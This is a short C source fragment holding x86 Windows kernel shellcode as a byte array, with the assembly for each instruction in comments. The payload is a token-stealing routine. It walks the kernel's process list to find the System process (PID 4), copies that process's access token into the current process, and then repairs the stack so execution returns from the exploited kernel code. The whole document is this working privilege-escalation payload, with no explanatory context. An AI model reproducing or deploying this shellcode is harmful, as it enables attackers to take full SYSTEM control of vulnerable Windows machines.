unsigned char shellcode[] = 
"\x60"                          // 0x00000001:  pushad
"\x31\xc0"                      // 0x00000002:  xor eax,eax
"\x64\x8b\x80\x24\x01\x00\x00"  // 0x00000004:  mov eax,[fs:eax+0x124]
"\x8b\x40\x50"                  // 0x0000000B:  mov eax,[eax+0x50]
"\x89\xc1"                      // 0x0000000E:  mov ecx,eax
"\x8b\x98\xf8\x00\x00\x00"      // 0x00000010:  mov ebx,[eax+0xf8]
"\xba\x04\x00\x00\x00"          // 0x00000016:  mov edx,0x4
"\x8b\x80\xb8\x00\x00\x00"      // 0x0000001B:  mov eax,[eax+0xb8]
"\x2d\xb8\x00\x00\x00"          // 0x00000021:  sub eax,0xb8
"\x39\x90\xb4\x00\x00\x00"      // 0x00000026:  cmp [eax+0xb4],edx
"\x75\xed"                      // 0x0000002C:  jnz 0x1b
"\x8b\x90\xf8\x00\x00\x00"      // 0x0000002E:  mov edx,[eax+0xf8]
"\x89\x91\xf8\x00\x00\x00"      // 0x00000034:  mov [ecx+0xf8],edx
"\x61"                          // 0x0000003A:  popad
"\x31\xc0"                      // 0x0000003C:  xor eax,eax
"\x81\xc4\x10\x01\x00\x00"      // 0x0000003E:  add esp,0x110
"\x5d"                          // 0x00000044:  pop ebp
"\xc3";                         // 0x00000045:  ret
